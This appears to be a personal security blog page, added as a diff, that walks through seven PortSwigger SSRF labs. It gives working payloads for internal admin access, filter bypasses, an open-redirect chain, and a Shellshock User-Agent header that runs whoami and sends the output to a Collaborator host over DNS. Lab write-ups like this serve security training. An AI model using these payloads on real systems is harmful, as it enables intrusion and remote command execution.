@@ -1,0 +1,344 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Server-side request forgery (SSRF) | Neslihan Gürgen</title>
+    <link rel="stylesheet" href="/style.css">
+</head>
+
+<body>
+
+    <header class="navbar">
+
+    <nav>
+
+        <a href="/">Home</a>
+
+        <a href="/posts/">Posts</a>
+
+        <a href="/research/">Research</a>
+
+        <a href="/projects/">Projects</a>
+
+        <a href="/categories/">Categories</a>
+
+        <a href="/cheat-sheets/">Cheat Sheets</a>
+
+    </nav>
+
+</header>
+
+    <div class="page">
+
+        <aside class="sidebar">
+
+        <div class="profile-image">
+            <img src="/assets/pinguu.jpg" alt="Neslihan Gürgen">        </div>
+
+        <h1>Neslihan Gürgen</h1>
+
+        <p class="role">
+            Junior Penetration Tester
+        </p>
+
+        <p class="bio">
+            Application Security |
+            Penetration Testing
+        </p>
+
+        <div class="social-links">
+            <a href="https://medium.com/@grgnes" target="_blank">Medium</a>
+            <a href="mailto:ngurgen08@gmail.com">Email</a>
+            <a href="https://github.com/grgnes" target="_blank">GitHub</a>
+            <a href="https://www.linkedin.com/in/neslihan-gurgen/" target="_blank">LinkedIn</a>
+        </div>
+
+    </aside>
+
+        <main class="content">
+            <article class="post-page">
+
+    <a class="category"
+       href="/categories/portswigger/">
+        PortSwigger
+    </a>
+
+    <h1>Server-side request forgery (SSRF)</h1>
+
+    <div class="date">
+        July 29, 2026
+    </div>
+
+    <div class="tags">
+        
+        <span>PortSwigger</span>
+        
+        <span>Web Security</span>
+        
+        <span>Access Control</span>
+        
+        <span>Authorization</span>
+        
+    </div>
+
+    <div class="post-content">
+        <h2 id="introduction">Introduction</h2>
+
+<p>SSRF (Server-Side Request Forgery) is a web security vulnerability that allows an attacker to make a server send requests to unintended destinations.</p>
+
+<h2 id="labs">Labs</h2>
+
+<h3 id="01-basic-ssrf-against-the-local-server">01. Basic SSRF against the local server</h3>
+
+<p>I captured the stock check request in Burp Suite. I found that the <code class="language-plaintext highlighter-rouge">stockApi</code> parameter sends a request to a URL.</p>
+
+<p><img src="/assets/posts/SSRF/image.png" width="700" /></p>
+
+<p>I changed the stockApi value to http://localhost. The server accessed the local server and displayed the admin panel.</p>
+
+<p><img src="/assets/posts/SSRF/image (1).png" width="700" /></p>
+
+<p>I found the delete endpoint in the admin panel. I sent a request to this endpoint using SSRF.</p>
+
+<p><img src="/assets/posts/SSRF/image (2).png" width="700" /></p>
+
+<p>I used the /admin/delete?username=carlos endpoint to delete the carlos user. I solved the lab.</p>
+
+<p><img src="/assets/posts/SSRF/image (3).png" width="700" /></p>
+
+<ul>
+  <li>injection</li>
+</ul>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">stockApi</span><span class="o">=</span><span class="n">http</span><span class="o">://</span><span class="n">localhost</span><span class="o">/</span><span class="n">admin</span><span class="o">/</span><span class="n">delete</span><span class="o">?</span><span class="n">username</span><span class="o">=</span><span class="n">carlos</span>
+</code></pre></div></div>
+
+<h3 id="02-basic-ssrf-against-another-back-end-system">02. Basic SSRF against another back-end system**</h3>
+
+<p>I captured the stock check request in Burp Suite. I analyzed the <code class="language-plaintext highlighter-rouge">stockApi</code> parameter and found that it could access internal systems.</p>
+
+<p><img src="/assets/posts/SSRF/image (4).png" width="700" /></p>
+
+<p>I used Burp Intruder to scan the 192.168.0.X addresses. I compared the HTTP responses and found the active host.</p>
+
+<p><img src="/assets/posts/SSRF/image (5).png" width="700" /></p>
+
+<p>I tested different paths on the discovered IP address. I found that the /admin endpoint was accessible.</p>
+
+<p><img src="&lt;/assets/posts/nosql/image (6).png&gt;" width="700" /></p>
+
+<p>I accessed the admin panel and found the delete endpoint. I confirmed that the carlos user could be deleted.</p>
+
+<p><img src="/assets/posts/SSRF/image (7).png" width="700" /></p>
+
+<p><img src="/assets/posts/SSRF/image (8).png" width="700" /></p>
+
+<p>I sent the /admin/delete?username=carlos request to the internal server. The server accepted the request.</p>
+
+<p><img src="/assets/posts/SSRF/image (9).png" width="700" /></p>
+
+<p>I sent the <code class="language-plaintext highlighter-rouge">/admin/delete?username=carlos</code> request to the internal server. The server accepted the request.</p>
+
+<ul>
+  <li>Injection</li>
+</ul>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">stockApi</span><span class="o">=</span><span class="n">http</span><span class="o">%</span><span class="mi">3</span><span class="nc">A</span><span class="o">%</span><span class="mi">2</span><span class="nc">F</span><span class="o">%</span><span class="mi">2</span><span class="no">F192</span><span class="mf">.168.0.198</span><span class="o">%</span><span class="mi">3</span><span class="no">A8080</span><span class="o">/</span><span class="n">admin</span><span class="o">/</span><span class="n">delete</span><span class="o">?</span><span class="n">username</span><span class="o">=</span><span class="n">carlos</span>
+</code></pre></div></div>
+
+<p>I used the SSRF vulnerability to delete the <strong>carlos</strong> user from the internal admin panel. I solved the lab.</p>
+
+<h3 id="03-blind-ssrf-with-out-of-band-detection">03. Blind SSRF with out-of-band detection</h3>
+
+<p>I opened the product page and captured the request in Burp Suite. I found the <code class="language-plaintext highlighter-rouge">Referer</code> header for the Blind SSRF test.</p>
+
+<p><img src="/assets/posts/SSRF/image (10).png" width="700" /></p>
+
+<p>I changed the <code class="language-plaintext highlighter-rouge">Referer</code> header to my Burp Collaborator URL. Then I sent the request again.</p>
+
+<p><img src="/assets/posts/SSRF/image (11).png" width="700" /></p>
+
+<p>I checked Burp Collaborator and received DNS and HTTP requests. This confirmed the Blind SSRF vulnerability.</p>
+
+<p><img src="/assets/posts/SSRF/image (12).png" width="700" /></p>
+
+<ul>
+  <li>Injection</li>
+</ul>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">Referer</span><span class="o">:</span> <span class="n">https</span><span class="o">://</span><span class="mi">9</span><span class="n">kumidudvxshf9ufdddu6adqkhq8ey2n</span><span class="mf">.</span><span class="n">oastify</span><span class="mf">.</span><span class="n">com</span>
+</code></pre></div></div>
+
+<h3 id="04-ssrf-with-blacklist-based-input-filter">04. SSRF with blacklist-based input filter</h3>
+
+<p>I captured the stock check request in Burp Suite. I confirmed that the <code class="language-plaintext highlighter-rouge">stockApi</code> parameter could access internal addresses.</p>
+
+<p><img src="/assets/posts/SSRF/image (13).png" width="700" /></p>
+
+<p>I tested the <code class="language-plaintext highlighter-rouge">127.0.0.1</code> address, but the request was blocked. The application was using a blacklist filter.</p>
+
+<p><img src="/assets/posts/SSRF/image (14).png" width="700" /></p>
+
+<p>I used the <code class="language-plaintext highlighter-rouge">127.0.0.2</code> address to bypass the blacklist filter. This allowed me to access the admin panel.</p>
+
+<p><img src="/assets/posts/SSRF/image (15).png" width="700" /></p>
+
+<p>I opened the <code class="language-plaintext highlighter-rouge">/admin</code> endpoint. I found the admin panel and the delete endpoint.</p>
+
+<p><img src="/assets/posts/SSRF/image (16).png" width="700" /></p>
+
+<p>I bypassed the filter and sent a request to the <code class="language-plaintext highlighter-rouge">/admin/delete</code> endpoint. I targeted the <strong>carlos</strong> user.</p>
+
+<p><img src="/assets/posts/SSRF/image (17).png" width="700" /></p>
+
+<p>I bypassed the filter and sent a request to the <code class="language-plaintext highlighter-rouge">/admin/delete</code> endpoint. I targeted the <strong>carlos</strong> user.</p>
+
+<p><img src="/assets/posts/SSRF/image (18).png" width="700" /></p>
+
+<ul>
+  <li>Injection</li>
+</ul>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">stockApi</span><span class="o">=</span><span class="n">http</span><span class="o">://</span><span class="mf">127.0.0.2</span><span class="o">/</span><span class="n">aDmin</span><span class="o">/</span><span class="n">delete</span><span class="o">?</span><span class="n">username</span><span class="o">=</span><span class="n">carlos</span>
+</code></pre></div></div>
+
+<p>I bypassed the blacklist-based SSRF filter, deleted the <strong>carlos</strong> user, and solved the lab.</p>
+
+<h3 id="05-ssrf-with-filter-bypass-via-open-redirection-vulnerability">05. SSRF with filter bypass via open redirection vulnerability</h3>
+
+<p>I confirmed that the <code class="language-plaintext highlighter-rouge">stockApi</code> parameter worked correctly when it was URL-decoded.</p>
+
+<p><img src="/assets/posts/SSRF/image (19).png" width="700" /></p>
+
+<p>Sending the same request in an encoded form caused the application to return a Missing parameter error.</p>
+
+<p><img src="/assets/posts/SSRF/image (20).png" width="700" /></p>
+
+<p>I tried setting the <code class="language-plaintext highlighter-rouge">stockApi</code> value to <code class="language-plaintext highlighter-rouge">http://localhost</code>, but the application rejected it as an Invalid URL.</p>
+
+<p><img src="/assets/posts/SSRF/image (21).png" width="700" /></p>
+
+<p>Submitting only a relative path (<code class="language-plaintext highlighter-rouge">/</code>) was accepted, indicating that the application only allowed internal paths.</p>
+
+<p><img src="/assets/posts/SSRF/image (22).png" width="700" /></p>
+
+<p>Since relative paths were accepted, I started exploring other endpoints and discovered the <code class="language-plaintext highlighter-rouge">nextProduct</code> endpoint.</p>
+
+<p>I confirmed that the <code class="language-plaintext highlighter-rouge">nextProduct</code> endpoint performed a <strong>302 redirect</strong> through the <code class="language-plaintext highlighter-rouge">path</code> parameter.</p>
+
+<p><img src="/assets/posts/SSRF/image (23).png" width="700" /></p>
+
+<p>By supplying different values to the <code class="language-plaintext highlighter-rouge">path</code> parameter, I confirmed that the application redirected to arbitrary locations.</p>
+
+<p><img src="/assets/posts/SSRF/image (24).png" width="700" /></p>
+
+<p>I attempted to use the discovered Open Redirect endpoint inside the <code class="language-plaintext highlighter-rouge">stockApi</code> parameter.</p>
+
+<p><img src="/assets/posts/SSRF/image (25).png" width="700" /></p>
+
+<p><img src="/assets/posts/SSRF/image (26).png" width="700" /></p>
+
+<p>The first attempt failed because the required <code class="language-plaintext highlighter-rouge">path</code> parameter was missing, resulting in a <strong>Missing parameter ‘path’</strong> error.</p>
+
+<p><img src="/assets/posts/SSRF/image (27).png" width="700" /></p>
+
+<p>I modified the Open Redirect endpoint to redirect the request to the internal admin panel and forwarded the SSRF request through it.</p>
+
+<p><img src="/assets/posts/SSRF/image (28).png" width="700" /></p>
+
+<p>Finally, the redirect chain reached <code class="language-plaintext highlighter-rouge">/admin/delete?username=carlos</code>, the <strong>carlos</strong> user was deleted, and the lab was completed.</p>
+
+<p><img src="/assets/posts/SSRF/image (29).png" width="700" /></p>
+
+<ul>
+  <li>Injection</li>
+</ul>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">stockApi</span><span class="o">=/</span><span class="n">product</span><span class="o">/</span><span class="n">nextProduct</span><span class="o">%</span><span class="mi">3</span><span class="n">fcurrentProductId</span><span class="o">%</span><span class="mi">3</span><span class="n">d2</span><span class="o">%</span><span class="mi">26</span><span class="n">path</span><span class="o">%</span><span class="mi">3</span><span class="n">dhttp</span><span class="o">%</span><span class="mi">3</span><span class="n">a</span><span class="c1">//192.168.0.12%3a8080/admin/delete%3fusername%3dcarlos</span>
+</code></pre></div></div>
+
+<h3 id="06-blind-ssrf-with-shellshock-exploitation">06. Blind SSRF with Shellshock exploitation</h3>
+
+<p>Captured the normal request.</p>
+
+<p><img src="/assets/posts/SSRF/image (30).png" width="700" /></p>
+
+<p>Changed the <strong>Referer</strong> header to my Burp Collaborator URL.</p>
+
+<p><img src="/assets/posts/SSRF/image (31).png" width="700" /></p>
+
+<p>Added the Shellshock payload to the <strong>User-Agent</strong> header and sent the request.</p>
+
+<p><img src="/assets/posts/SSRF/image (32).png" width="700" /></p>
+
+<p>Burp Collaborator received a DNS request. The subdomain contains <strong>peter</strong>, which is the result of the <code class="language-plaintext highlighter-rouge">whoami</code> command.</p>
+
+<p><img src="/assets/posts/SSRF/image (33).png" width="700" /></p>
+
+<ul>
+  <li>Injection</li>
+</ul>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">User</span><span class="o">-</span><span class="nc">Agent</span><span class="o">:</span> <span class="p">()</span> <span class="p">{</span> <span class="o">:</span><span class="p">;</span> <span class="p">};</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">nslookup</span> <span class="err">$</span><span class="p">(</span><span class="n">whoami</span><span class="p">)</span><span class="mf">.0</span><span class="n">stpmkyafabx8tmdt8k8o2sck3quek29</span><span class="mf">.</span><span class="n">oastify</span><span class="mf">.</span><span class="n">com</span>
+<span class="nc">Referer</span><span class="o">:</span> <span class="n">http</span><span class="o">://</span><span class="mf">192.168.0.1</span><span class="o">:</span><span class="mi">8080</span>
+</code></pre></div></div>
+
+<h3 id="07-ssrf-with-whitelist-based-input-filter">07. SSRF with whitelist-based input filter</h3>
+
+<p>Tried <code class="language-plaintext highlighter-rouge">http://127.0.0.1</code>, but the application only accepted the <strong>stock.weliketoshop.net</strong> host.</p>
+
+<p><img src="/assets/posts/SSRF/image (34).png" width="700" /></p>
+
+<p>Tried using <code class="language-plaintext highlighter-rouge">username@stock.weliketoshop.net</code>, but the request could not connect to the stock check service.</p>
+
+<p><img src="/assets/posts/SSRF/image (35).png" width="700" /></p>
+
+<p>Added <code class="language-plaintext highlighter-rouge">#</code> after the username, but it was blocked.</p>
+
+<p><img src="/assets/posts/SSRF/image (36).png" width="700" /></p>
+
+<p>Encoded <code class="language-plaintext highlighter-rouge">#</code> as <code class="language-plaintext highlighter-rouge">%23</code>, but the request was still blocked.</p>
+
+<p><img src="/assets/posts/SSRF/image (37).png" width="700" /></p>
+
+<p>Double encoded <code class="language-plaintext highlighter-rouge">#</code> (<code class="language-plaintext highlighter-rouge">%2523</code>). This bypassed the whitelist validation.</p>
+
+<p>“#” → %23 → %2523</p>
+
+<p><img src="/assets/posts/SSRF/image (38).png" width="700" /></p>
+
+<p>Used <code class="language-plaintext highlighter-rouge">http://localhost%2523stock.weliketoshop.net</code>. The request reached the internal application.</p>
+
+<p><img src="/assets/posts/SSRF/image (39).png" width="700" /></p>
+
+<p>Added the <code class="language-plaintext highlighter-rouge">/admin</code> path and opened the admin panel.</p>
+
+<p><img src="/assets/posts/SSRF/image (40).png" width="700" /></p>
+
+<p>Sent a request to <code class="language-plaintext highlighter-rouge">/admin/delete?username=carlos</code> and deleted the <strong>carlos</strong> user.</p>
+
+<p><img src="/assets/posts/SSRF/image (41).png" width="700" /></p>
+
+<ul>
+  <li>Injection</li>
+</ul>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">stockApi</span><span class="o">=</span><span class="n">http</span><span class="o">://</span><span class="n">localhost</span><span class="o">%</span><span class="mi">2523</span><span class="o">@</span><span class="n">stock</span><span class="mf">.</span><span class="n">weliketoshop</span><span class="mf">.</span><span class="n">net</span><span class="o">/</span><span class="n">admin</span><span class="o">/</span><span class="n">delete</span><span class="o">?</span><span class="n">username</span><span class="o">=</span><span class="n">carlos</span>
+</code></pre></div></div>
+
+
+    </div>
+
+</article>
+        </main>
+
+    </div>
+
+    <footer>
+    © 2026 Neslihan Gürgen
+</footer>
+
+</body>
+</html>
